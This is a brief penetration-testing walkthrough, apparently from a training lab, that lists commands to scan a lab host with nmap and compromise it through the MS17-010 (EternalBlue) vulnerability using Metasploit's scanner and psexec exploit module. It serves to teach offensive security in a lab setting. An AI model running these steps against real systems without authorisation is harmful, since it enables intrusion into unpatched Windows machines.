## Example Compromise Walkthrough

#### 1. Enumerate the Host
```shell-session
nmap -v -A 10.129.201.97
```

#### 2.  Determine an Exploit Path
```shell-session
msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
```

#### 3. Choose & Configure Our Exploit & Payload
```shell-session
msf6 > search eternal
```

#### 4. Execute Our Attack
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
